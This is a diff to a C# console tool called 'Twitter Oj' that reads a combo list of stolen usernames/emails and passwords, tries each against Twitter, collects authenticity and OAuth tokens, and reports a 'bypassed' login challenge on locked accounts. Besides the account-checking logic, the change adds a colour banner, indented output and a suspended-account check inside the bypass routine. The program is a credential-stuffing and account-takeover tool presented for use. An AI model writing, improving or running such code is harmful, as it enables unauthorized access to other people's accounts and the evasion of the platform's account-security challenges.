@@ -18,21 +18,43 @@ namespace Twitter_Oj
 
             Console.Title = "Twitter Oj | by Matthew";
 
+            string[] ojBanner = new string[]
+            {
+                @" ",
+                @"  ,--------.           ,--.  ,--.    ,--.                     ,-----.  ,--.",
+                @"  '--.  .--',--.   ,--.`--',-'  '-.,-'  '-. ,---. ,--.--.    '  .-.  ' `--'",
+                @"     |  |   |  |.'.|  |,--.'-.  .-''-.  .-'| .-. :|  .--'    |  | |  | ,--.  version 0.3.1.16",
+                @"     |  |   |   .'.   ||  |  |  |    |  |  \   --.|  |       '  '-'  ' |  |  by Matthew",
+                @"     `--'   '--'   '--'`--'  `--'    `--'   `----'`--'        `-----'.-'  /  @schiedam, @wiet",
+                @"                                                                     '---'",
+            };
+
+
+            int r = 225;int g = 255;int b = 250;
+            for (int i = 0; i < 7; i++)
+            {
+                Console.WriteLine(ojBanner[i], Color.FromArgb(r, g, b));
+                r -= 18;b -= 9;
+            }
+
 
             //#> Provide some information
-            Console.Write("combo list path: ");
+            Console.ForegroundColor = Color.DarkGray;
+            Console.Write("  combo list path: ");
             Console.ForegroundColor = Color.White;
             string combolist = Console.ReadLine();
 
             Console.ForegroundColor = Color.DarkGray;
-            Console.Write("username_or_email split: ");
+            Console.Write("  username_or_email split: ");
             Console.ForegroundColor = Color.White;
             int u_split = ushort.Parse(Console.ReadLine());
 
             Console.ForegroundColor = Color.DarkGray;
-            Console.Write("password split: ");
+            Console.Write("  password split: ");
             Console.ForegroundColor = Color.White;
             int p_split = ushort.Parse(Console.ReadLine());
+
+            Console.WriteLine("");
 
             //#> Create a StreamReader
             StreamReader ImportFile = new StreamReader(combolist);
@@ -52,7 +74,7 @@ namespace Twitter_Oj
 
             //#> Done with all accounts
             Formatter[] Format = new Formatter[] { new Formatter(doneTotal, Color.White), new Formatter(doneAdded, Color.White), };
-            Console.WriteLineFormatted("[Done/{0}] {1} out of {0} added.", Color.DarkGray, Format);
+            Console.WriteLineFormatted("  [Done/{0}] {1} out of {0} added.", Color.DarkGray, Format);
             Console.ReadLine();
 
         }
@@ -114,7 +136,7 @@ namespace Twitter_Oj
 
                     var short_authenticity_token = authenticity_token != null ? string.Join("", authenticity_token.Take(13)) : null;
                     var short_oauth_token = oauth_token != null ? string.Join("", oauth_token.Take(13)) : null;
-                    string account_information = String.Format("[{1}/{2}] ", "", short_authenticity_token, short_oauth_token);
+                    string account_information = String.Format("  [{1}/{2}] ", "", short_authenticity_token, short_oauth_token);
 
                     //#> If the account is locked
                     if (valid_oauth.Content.Contains("login-challenge-form"))
@@ -188,12 +210,21 @@ namespace Twitter_Oj
                                 //#> Get the screenname with user_id
                                 Request.BaseUrl = new Uri("https://twitter.com");
                                 var requestUsername = Request.Get(new RestRequest(String.Format("/intent/user?user_id={0}", user_id)));
-                                bypassTemp = getBetween(requestUsername.Content, "<span class=\"nickname\">@", "</span>");
 
-                                Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("TemporaryPassword", Color.Orange), };
-                                Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1}): bypassed", Color.DarkGray, Format);
+                                if (requestUsername.ResponseUri.ToString() != "https://mobile.twitter.com/account/suspended")
+                                {
+                                    bypassTemp = getBetween(requestUsername.Content, "<span class=\"nickname\">@", "</span>");
 
-                                goto login;
+                                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("TemporaryPassword", Color.Orange), };
+                                    Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1}): bypassed", Color.DarkGray, Format);
+
+                                    goto login;
+                                }
+                                else
+                                {
+                                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Suspended account", Color.Red), };
+                                    Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1})", Color.DarkGray, Format);
+                                }
                             }
                             catch
                             {
@@ -263,7 +294,7 @@ namespace Twitter_Oj
                     else if (valid_oauth.Content.Contains("<title>Twitter / ?</title>"))
                     {
                         Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Core", Color.Gold), };
-                        Console.WriteLineFormatted("[Error/requestUrl] {0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
+                        Console.WriteLineFormatted("  [Error/requestUrl] {0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
                     }
 
                     //#> If the account is all valid
@@ -299,7 +330,7 @@ namespace Twitter_Oj
                     else
                     {
                         Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Suspended account", Color.Red), };
-                        Console.WriteLineFormatted("[Error/requestUrl] {0}: {1}", Color.DarkGray, Format);
+                        Console.WriteLineFormatted("  [Error/requestUrl] {0}: {1}", Color.DarkGray, Format);
                     }
 
                 }
@@ -307,7 +338,7 @@ namespace Twitter_Oj
                 {
                     //#> requestUrl API is down, retry
                     Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Core", Color.Gold), };
-                    Console.WriteLineFormatted("[Error/requestUrl] {0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
+                    Console.WriteLineFormatted("  [Error/requestUrl] {0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
                     goto request_oauth_token;
                 }
 
@@ -315,7 +346,7 @@ namespace Twitter_Oj
             catch
             {
                 Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), };
-                Console.WriteLineFormatted("[Error/Unknown] {0}: Unknown Error while checking account, retrying", Color.DarkGray, Format);
+                Console.WriteLineFormatted("  [Error/Unknown] {0}: Unknown Error while checking account, retrying", Color.DarkGray, Format);
                 goto Twitter;
             }
 
